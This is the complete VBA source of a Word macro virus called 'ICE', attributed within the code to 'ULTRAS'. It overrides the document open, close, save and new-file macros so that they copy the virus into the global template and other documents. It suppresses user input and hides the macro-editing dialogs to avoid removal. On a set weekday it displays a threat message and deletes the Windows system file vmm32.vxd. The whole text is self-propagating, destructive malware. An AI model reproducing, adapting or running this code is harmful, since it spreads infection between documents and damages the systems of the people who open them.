   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ToolsCustomize"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "????????? ?????????? ???????????? Word (????, ?????????? ? ?????? ????????????)"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsCustomize.MAIN"
   On Error Resume Next
   WordBasic.Call "ICE.ToLCos"
   End Sub

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "????????? ????????? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
   On Error Resume Next
   WordBasic.Beep
   WordBasic.Call "ICE.Infect"
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "??????, ????????, ???????? ??? ????????? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ToolsMacro.MAIN"
   On Error Resume Next
   WordBasic.Call "ICE.ToLMac"
   End Sub

   Attribute VB_Name = "FileClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "???????? ???? ???? ????????? ?????????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileClose.MAIN"
   On Error Resume Next
   WordBasic.Call "ICE.Infect"
   WordBasic.FileClose
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.Call "ICE.Infect"
   End Sub

   Attribute VB_Name = "FileSave"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "?????????? ????????? ????????? ??? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileSave.MAIN"
   On Error Resume Next
   WordBasic.Call "ICE.Infect"
   WordBasic.FileSave
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   On Error Resume Next
   WordBasic.Call "ICE.Infect"
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   WordBasic.DisableAutoMacros
   End Sub

   Attribute VB_Name = "FileNew"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "???????? ?????? ????????? ??? ???????"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileNew.MAIN"
   On Error Resume Next
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileNew(False)
   WordBasic.CurValues.FileNew dlg
   WordBasic.Dialog.FileNew dlg
   WordBasic.FileNew dlg
   WordBasic.Call "ICE.Infect"
   End Sub

   Attribute VB_Name = "ICE"

   Dim ICEMacros
   Dim Macros__$()
   Public Sub MAIN()
   ReDim Macros__$(9)
   ICEMacros = 0
   '     =ICE=
   'Written by ULTRAS
   'ULTRAS (ultras2@usa.net)
   End Sub
   Private Sub Infect()
   Dim x
   On Error GoTo -1: On Error GoTo Infect
   WordBasic.DisableInput 1
   WordBasic.DisableAutoMacros 0
   VirMacros
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, FastSaves:=1, AutoSave:=1, SaveInterval:="10"
   For x = 1 To ICEMacros
   WordBasic.MacroCopy "Global:" + Macros__$(x - 1), WordBasic.[WindowName$]() + ":" + Macros__$(x - 1), 1
   Next x
   GoTo ULTRAS
   Infect:
   End Sub
   Private Sub ToLMac()
   On Error GoTo -1: On Error GoTo TM
   WordBasic.ScreenUpdating
   WordBasic.FileNew
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsMacro(False)
   WordBasic.CurValues.ToolsMacro dlg
   WordBasic.Dialog.ToolsMacro dlg
   WordBasic.FileClose 2
   WordBasic.ScreenUpdating
   WordBasic.ToolsMacro dlg
   TM:
   End Sub
   Private Sub ToLCos()
   On Error GoTo -1: On Error GoTo TC
   WordBasic.ScreenUpdating
   WordBasic.FileNew
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.ToolsCustomize(False)
   WordBasic.CurValues.ToolsCustomize dlg
   WordBasic.Dialog.ToolsCustomize dlg
   WordBasic.FileClose 2
   WordBasic.ScreenUpdating
   WordBasic.ToolsCustomize dlg
   TC:
   End Sub
   Private Sub VirMacros()
   On Error Resume Next
   Let ICEMacros = 10
   Let Macros__$(0) = "ICE"
   Let Macros__$(1) = "AutoOpen"
   Let Macros__$(2) = "AutoClose"
   Let Macros__$(3) = "AutoExec"
   Let Macros__$(4) = "FileClose"
   Let Macros__$(5) = "FileNew"
   Let Macros__$(6) = "FileSave"
   Let Macros__$(7) = "ToolsMacro"
   Let Macros__$(8) = "ToolsCustomize"
   Let Macros__$(9) = "FileTemplates"
   End Sub
   Private Sub ULTRAS()
   On Error Resume Next
   If WordBasic.Minute(WordBasic.Now()) = 33 Then WordBasic.Insert "= ICE =  Written by ULTRAS"
   If WordBasic.Weekday(WordBasic.Now()) = 2 Then
   WordBasic.MsgBox " Hello user your computer is infected by ICE virus." + Chr(13) + _
          " Through several seconds your system will be destroyed." + Chr(13) + Chr(13) + _
          " Written by ULTRAS", "ULTRAS...", 16
   SetAttr "c:\windows\System\vmm32.vxd", 0
   WordBasic.Kill "c:\windows\System\vmm32.vxd"
   End If
   End Sub
